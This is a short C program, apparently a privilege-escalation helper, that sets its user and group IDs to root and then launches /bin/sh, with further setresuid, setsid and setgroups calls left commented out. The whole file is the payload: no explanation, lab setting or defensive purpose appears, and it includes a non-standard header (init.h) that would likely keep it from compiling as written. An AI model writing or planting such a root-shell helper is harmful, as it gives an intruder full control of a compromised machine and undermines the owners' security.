#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <init.h>
#include <sys/types.h>

int main() {
    setuid(0);
    setgid(0);
    // setresuid(0, 0, 0);
    // setsid();
    // gid_t new_groups[] = {0};
    
    // setgroups(1, new_groups);
    system("/bin/sh");
    return 0;
}